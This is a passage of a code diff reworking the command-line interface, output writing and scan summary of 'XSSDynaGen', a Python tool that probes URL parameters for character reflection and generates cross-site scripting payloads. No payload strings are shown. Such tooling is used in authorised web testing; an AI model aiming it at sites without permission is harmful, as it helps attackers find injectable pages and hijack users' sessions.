+                    'requests_made': analyzer.stats['requests'],
+                    'cache_hits': analyzer.cache.hits,
+                },
+            }
+            for url, url_res in all_results.items():
+                entry: Dict[str, Any] = {'url': url, 'parameters': []}
+                for param_name, data in url_res.items():
+                    pa: ParamAnalysis = data['analysis']
+                    entry['parameters'].append({
+                        'name': pa.param,
+                        'allowed_chars': sorted(pa.allowed_chars),
+                        'blocked_chars': sorted(pa.blocked_chars),
+                        'max_length': pa.max_length,
+                        'allows_scripts': pa.allows_scripts,
+                        'allows_events': pa.allows_events,
+                        'allows_angles': pa.allows_angles,
+                        'allows_quotes': pa.allows_quotes,
+                        'allows_parens': pa.allows_parens,
+                        'allows_spaces': pa.allows_spaces,
+                        'payloads': data['payloads'],
+                    })
+                json_data['results'].append(entry)
+
+            with open(out_path, 'w', encoding='utf-8') as f:
+                json.dump(json_data, f, indent=2, ensure_ascii=False)
+        else:
+            out_path = analyzer.payloads_dir / f"{analyzer.output_file}_{ts}.txt"
+            with open(out_path, 'w', encoding='utf-8', buffering=8192) as f:
                 for payload in sorted(unique_payloads):
-                    stripped_payload = payload.replace('\n', '').replace('\r', '').strip()
-                    if stripped_payload:
-                        f.write(f"{stripped_payload}\n")
-            remove_empty_lines(output_path)
-        except Exception as e:
-            logging.error(f"Error writing to {output_path}: {e}")
-        duration = int(time.time() - start_time)
-        minutes, seconds = divmod(duration, 60)
-        print("\n")
-        print(f"{Fore.CYAN}🏁 Scan Complete! Summary:{Style.RESET_ALL}")
-        print("=" * SUMMARY_LINE_LENGTH)
-        print(f"Duration: {Fore.GREEN}{minutes}m {seconds}s{Style.RESET_ALL}")
-        print(f"URLs processed: {Fore.GREEN}{len(urls)}{Style.RESET_ALL}")
-        print(f"Total payloads generated: {Fore.GREEN}{total_payloads}{Style.RESET_ALL}")
-        print(f"Unique payloads: {Fore.GREEN}{len(unique_payloads)}{Style.RESET_ALL}")
-        print("=" * SUMMARY_LINE_LENGTH)
-        print(f"\n{Fore.CYAN}📝 Results saved to:{Style.RESET_ALL} {Fore.GREEN}{str(output_path.absolute())}{Style.RESET_ALL}")
+                    f.write(f"{payload}\n")
+
+        if not analyzer.quiet:
+            print(f"\n\n{C('Scan Complete — Summary:', Fore.CYAN)}")
+            print("=" * 45)
+            print(f"  Duration         : {C(f'{mins}m {secs}s', Fore.GREEN)}")
+            print(f"  URLs processed   : {C(str(len(urls)), Fore.GREEN)}")
+            print(f"  Params analyzed  : {C(str(analyzer.stats['params_analyzed']), Fore.GREEN)}")
+            print(f"  Unique payloads  : {C(str(len(unique_payloads)), Fore.GREEN)}")
+            print(f"  HTTP requests    : {C(str(analyzer.stats['requests']), Fore.GREEN)}")
+            print(f"  Cache hits       : {C(str(analyzer.cache.hits), Fore.GREEN)}")
+            print(f"  Failed requests  : {C(str(analyzer.stats['failures']), Fore.YELLOW)}")
+            print("=" * 45)
+            print(f"  Output: {C(str(out_path.resolve()), Fore.GREEN)}")
+            print()
+
     except asyncio.CancelledError:
-        if 'progress_bar' in locals():
-            progress_bar.close()
-        print("\n")
-        print(f"{Fore.YELLOW}🚫 Scan interrupted by user{Style.RESET_ALL}")
-    except Exception as e:
-        if 'progress_bar' in locals():
-            progress_bar.close()
-        logging.error(f"Error during scan: {str(e)}")
-        print(f"\n{Fore.RED}Error during scan: {str(e)}{Style.RESET_ALL}")
+        if not analyzer.quiet:
+            print(f"\n{C('Scan cancelled.', Fore.YELLOW)}")
+    except Exception as exc:
+        logging.error(f"Scan error: {exc}", exc_info=True)
+        print(f"\n{C(f'Error: {exc}', Fore.RED)}")
     finally:
-        if analyzer and analyzer.session and not analyzer.session.closed:
-            await analyzer.session.close()
-            await asyncio.sleep(0.1)
+        await analyzer.close_session()
+
+
+# ── CLI ──────────────────────────────────────────────────────────────────
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog='xssdynagen',
+        description='XSSDynaGen — Dynamic XSS payload generator based on server character reflection analysis.',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=f"""\
+examples:
+  %(prog)s -d "https://target.com/page?id=1&name=test"
+  %(prog)s -l urls.txt -c 80 -t 15
+  %(prog)s -l urls.txt -p http://127.0.0.1:8080 --delay 100
+  %(prog)s -l urls.txt --json -o results
+  cat urls.txt | %(prog)s -l - -q --json
+
+{GITHUB_URL}""",
+    )
+
+    src = p.add_mutually_exclusive_group()
+    src.add_argument('-d', '--domain', metavar='URL',
+                     help='Single URL with parameter(s) to analyze')
+    src.add_argument('-l', '--url-list', metavar='FILE',
+                     help='File with URLs (one per line), or "-" for stdin')
+
+    p.add_argument('-o', '--output', default='xss_payloads_gen', metavar='NAME',
+                   help='Output file base name (default: xss_payloads_gen)')
+    p.add_argument('-c', '--connections', type=int, default=DEFAULT_MAX_CONNECTIONS, metavar='N',
+                   help=f'Max concurrent connections (default: {DEFAULT_MAX_CONNECTIONS})')
+    p.add_argument('-t', '--timeout', type=int, default=DEFAULT_TIMEOUT, metavar='SEC',
+                   help=f'Request timeout in seconds (default: {DEFAULT_TIMEOUT})')
+    p.add_argument('-H', '--header', action='append', metavar='"K: V"',
+                   help='Custom header (repeatable)')
+    p.add_argument('-f', '--char-file', metavar='FILE',
+                   help='Custom character-group definition file')
+    p.add_argument('-p', '--proxy', metavar='URL',
+                   help='HTTP proxy URL (e.g. http://127.0.0.1:8080)')
+    p.add_argument('--delay', type=int, default=DEFAULT_DELAY, metavar='MS',
+                   help='Delay between requests in ms; serialises requests when > 0 (default: 0)')
+    p.add_argument('--retries', type=int, default=DEFAULT_RETRIES, metavar='N',
+                   help=f'Max retries per failed request (default: {DEFAULT_RETRIES})')
+    p.add_argument('-v', '--verbose', action='store_true',
+                   help='Verbose logging and per-parameter analysis details')
+    p.add_argument('-q', '--quiet', action='store_true',
+                   help='Suppress banner and progress output')
+    p.add_argument('--json', action='store_true', dest='json_output',
+                   help='Write JSON output with full analysis details')
+    p.add_argument('--no-color', action='store_true',
+                   help='Disable colored output')
+    p.add_argument('--skip-update-check', action='store_true',
+                   help='Skip the automatic git update check')
+    p.add_argument('-u', '--update', action='store_true',
+                   help='Update to the latest version via git and exit')
+    p.add_argument('--version', action='version', version=f'%(prog)s {VERSION}')
+    return p
+
+
+def parse_headers(raw: Optional[List[str]]) -> Dict[str, str]:
+    headers: Dict[str, str] = {}
+    if not raw:
+        return headers
+    for h in raw:
+        if ':' not in h:
+            print(C(f"Invalid header (expected 'Key: Value'): {h}", Fore.RED))
+            sys.exit(1)
+        k, v = h.split(':', 1)
+        headers[k.strip()] = v.strip()
+    return headers
+
+
+def validate_domain_url(url: str) -> str:
+    url = url.strip()
+    if not url.startswith(('http://', 'https://')):
+        print(C("Error: URL must start with http:// or https://", Fore.RED))
+        print(C("Example: https://example.com/page?param1=value", Fore.CYAN))
+        sys.exit(1)
+    parsed = urllib.parse.urlparse(url)
+    if not parsed.query or not urllib.parse.parse_qs(parsed.query, keep_blank_values=True):
+        print(C("Error: URL must contain at least one query parameter", Fore.RED))
+        print(C("Example: https://example.com/page?param1=value&param2=test", Fore.CYAN))
+        sys.exit(1)
+    return url
+
+
+def load_urls(args) -> Tuple[List[str], int]:
+    if args.domain:
+        url = validate_domain_url(args.domain)
+        return [url], 0
+
+    if args.url_list == '-':
+        raw = sys.stdin.readlines()
+    else:
+        path = Path(args.url_list)
+        if not path.is_file():
+            print(C(f"Error: File not found: {args.url_list}", Fore.RED))
+            sys.exit(1)
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            raw = f.readlines()
+
+    urls, skipped = filter_urls(raw)
+    if not urls:
+        print(C("Error: No valid URLs with parameters found", Fore.RED))
+        sys.exit(1)
+    return urls, skipped
+
 
 def main():
-    parser = argparse.ArgumentParser(
-        description="",
-        formatter_class=argparse.RawTextHelpFormatter,
-        add_help=False,
-        usage='%(prog)s [-h HELP] [-d DOMAIN | -l URL_LIST] [-o OUTPUT] [-c CONNECTIONS] [-b BATCH_SIZE] [-H HEADER] [-u UPDATE]'
-    )
-    parser.add_argument('-h', '--help',
-                      action='help',
-                      help='Show this help message and exit')
-    parser.add_argument('-u', '--update',
-                      action='store_true',
-                      help='Check for updates and automatically install the latest version')
-    group = parser.add_mutually_exclusive_group(required=False)
-    group.add_argument('-d', '--domain',
-                      help='Specify the domain with parameter(s) to scan (required unless -l is used)',
-                      metavar='')
-    group.add_argument('-l', '--url-list',
-                      help='Provide a file containing a list of URLs with parameters to scan (required unless -d is used)',
-                      metavar='')
-    parser.add_argument('-o', '--output',
-                      default='xss_payloads_gen',
-                      help='Specify the output file name',
-                      metavar='')
-    parser.add_argument('-c', '--connections',
-                      type=int,
-                      default=DEFAULT_MAX_CONNECTIONS,
-                      help='Set the maximum number of concurrent connections',
-                      metavar='')
-    parser.add_argument('-b', '--batch-size',
-                      type=int,
-                      default=DEFAULT_BATCH_SIZE,
-                      help='Define the number of requests per batch',
-                      metavar='')
-    parser.add_argument('-H', '--header',
-                      action='append',
-                      help='Custom headers can be specified multiple times. Format: "Header: Value"',
-                      metavar='')
-    parser.add_argument('-f', '--char-file',
-                      help='Specify a file containing character groups to test',
-                      metavar='')
+    global _color_enabled
 
-    class CustomParser(argparse.ArgumentParser):
-        def error(self, message):
-            args = sys.argv[1:]
-            if '-u' in args or '--update' in args:
-                if len(args) == 1:
-                    return
-            self.print_help()
-            if "one of the arguments -d/--domain -l/--url-list is required" in message:
-                print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
-            sys.exit(2)
-
-    parser.__class__ = CustomParser
-    if len(sys.argv) == 1:
-        parser.print_help()
-        print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
-        sys.exit(2)
+    parser = build_parser()
     args = parser.parse_args()
+
+    if args.no_color:
+        _color_enabled = False
+        colorama_init(strip=True)
+    else:
+        colorama_init(autoreset=True)
+
+    warnings.filterwarnings('ignore', category=RuntimeWarning, module='asyncio')
+    setup_logging(verbose=args.verbose)
+
     if args.update:
-        print(f"\n{Fore.CYAN}Checking for updates...{Style.RESET_ALL}")
+        print(C("Checking for updates...", Fore.CYAN))
         updater = AutoUpdater()
-        if not updater.is_git_repo:
-            print(f"{Fore.RED}Not a git repository. Cannot update.{Style.RESET_ALL}")
+        result = updater.apply_update()
+        if result['ok']:
+            print(C(f"Version: {result.get('version', VERSION)} — {result['message']}", Fore.GREEN))
+            if 'Updated' in result['message']:
+                print(C("Restart the tool to use the new version.", Fore.YELLOW))
+        else:
+            print(C(f"Update failed: {result['message']}", Fore.RED))
             sys.exit(1)
-        has_changes, info = updater._get_remote_changes()
-        if info == "Check skipped":
-            print(f"{Fore.GREEN}Check skipped{Style.RESET_ALL}")
-            sys.exit(0)
-        elif not has_changes:
-            print(f"{Fore.GREEN}Already at latest version{Style.RESET_ALL}")
-            sys.exit(0)
-        update_result = updater._perform_update()
-        if update_result.get('status') == 'error':
-            print(f"{Fore.RED}Update failed: {update_result.get('message')}{Style.RESET_ALL}")
-            sys.exit(1)
-        print(f"{Fore.GREEN}Tool updated successfully!{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Please restart the tool to use the new version.{Style.RESET_ALL}")
         sys.exit(0)
-    if not (args.domain or args.url_list):
+
+    if not args.domain and not args.url_list:
         parser.print_help()
-        print(f"\n{Fore.RED}❌ One of the arguments is required: -d/--domain or -l/--url-list{Style.RESET_ALL}")
+        print(f"\n{C('Error: -d/--domain or -l/--url-list is required', Fore.RED)}")
         sys.exit(2)
-    headers = {}
-    if args.header:
-        for header in args.header:
-            try:
-                key, value = header.split(':', 1)
-                headers[key.strip()] = value.strip()
-            except ValueError:
-                print(f"{Fore.RED}Invalid header format: {header}. Use 'Header: Value' format.{Style.RESET_ALL}")
-                sys.exit(1)
-    try:
-        if args.domain:
-            domain_url = args.domain.strip()
-            if not domain_url.startswith(('http://', 'https://')):
-                print(f"\n{Fore.RED}❌ Error: Invalid URL format.{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}🧩 URL must start with http:// or https://{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
-                sys.exit(1)
-            if '?' not in domain_url:
-                print(f"\n{Fore.RED}❌ Error: The provided URL must contain at least one parameter.{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}🧩 Please ensure the URL includes at least one query parameter.{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
-                sys.exit(1)
-            parsed = urllib.parse.urlparse(domain_url)
-            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-            if not params:
-                print(f"\n{Fore.RED}❌ Error: The provided URL must contain at least one parameter.{Style.RESET_ALL}")
-                print(f"{Fore.YELLOW}🧩 Please ensure the URL includes at least one query parameter.{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}🔗 Example of a valid URL: https://example.com/page?param1=value&param2=test{Style.RESET_ALL}")
-                sys.exit(1)
-    except Exception as e:
-        print(f"{Fore.RED}❌ Error: Unable to parse URL: {str(e)}{Style.RESET_ALL}")
-        sys.exit(1)
+
+    headers = parse_headers(args.header)
+    urls, skipped = load_urls(args)
+
+    version_info: Dict[str, Any] = {'current': VERSION, 'update': None}
+    if not args.skip_update_check:
+        try:
+            updater = AutoUpdater()
+            version_info = updater.check()
+        except Exception:
+            pass
+
     analyzer = XSSParamAnalyzer(
         max_connections=args.connections,
-        batch_size=args.batch_size,
+        timeout=args.timeout,
         output_file=args.output,
         headers=headers,
-        char_file=args.char_file
+        char_file=args.char_file,
+        proxy=args.proxy,
+        delay=args.delay,
+        retries=args.retries,
+        verbose=args.verbose,
+        quiet=args.quiet,
     )
-    analyzer.banner()
-    urls = []
-    ignored_urls = 0
-    print(f"{Fore.CYAN}📦 Loading URLs...{Style.RESET_ALL}")
-    if args.domain:
-        urls = [domain_url]
-        parsed = urllib.parse.urlparse(domain_url)
-        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
-        param_count = len(params)
-        param_word = "parameters" if param_count > 1 else "parameter"
-        print(f"{Fore.GREEN}🔗 Loaded: 1 URL with {param_count} {param_word}{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}🔍 Starting the scan...{Style.RESET_ALL}")
-    elif args.url_list:
-        try:
-            with open(args.url_list, 'r') as f:
-                raw_urls = f.readlines()
-            filtered_urls, no_params = filter_urls(raw_urls)
-            urls = filtered_urls
-            ignored_urls = no_params
-            url_count = len(urls)
-            if url_count > 0:
-                print(f"{Fore.GREEN}🔗 Loaded: {url_count} URLs with parameters{Style.RESET_ALL}")
-                if ignored_urls > 0:
-                    print(f"{Fore.YELLOW}⚠️  Skipped: {ignored_urls} URLs without parameters{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}🔍 Starting the scan...{Style.RESET_ALL}")
-            else:
-                print(f"{Fore.RED}❌ No valid URLs with parameters found in the file{Style.RESET_ALL}")
-                sys.exit(1)
-        except FileNotFoundError:
-            print(f"{Fore.RED}❌ Error: File not found: {args.url_list}{Style.RESET_ALL}")
-            sys.exit(1)
-        except Exception as e:
-            print(f"{Fore.RED}❌ Error reading URL file: {str(e)}{Style.RESET_ALL}")
-            sys.exit(1)
-    asyncio.run(process_urls(
-        urls=urls,
-        output_file=args.output,
-        max_connections=args.connections,
-        batch_size=args.batch_size,
-        headers=headers,
-        ignored_urls=ignored_urls,
-        char_file=args.char_file
-    ))
+
+    analyzer.banner(version_info)
+
+    if not args.quiet:
+        print(C(f"Loaded {len(urls)} URL(s) with parameters", Fore.GREEN))
+        if skipped:
+            print(C(f"Skipped {skipped} URL(s) without parameters", Fore.YELLOW))
+        print()
+
+    asyncio.run(process_urls(analyzer, urls, json_output=args.json_output))
+
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{Fore.YELLOW}🚫 Scan interrupted by user{Style.RESET_ALL}")
-        sys.exit(0)
-    except Exception as e:
-        print(f"\n{Fore.RED}Unhandled exception: {str(e)}{Style.RESET_ALL}")
+        print(f"\n{C('Interrupted.', Fore.YELLOW)}")
+        sys.exit(130)
+    except Exception as exc:
+        logging.critical(f"Fatal: {exc}", exc_info=True)
+        print(f"\n{C(f'Fatal error: {exc}', Fore.RED)}")
         sys.exit(1)
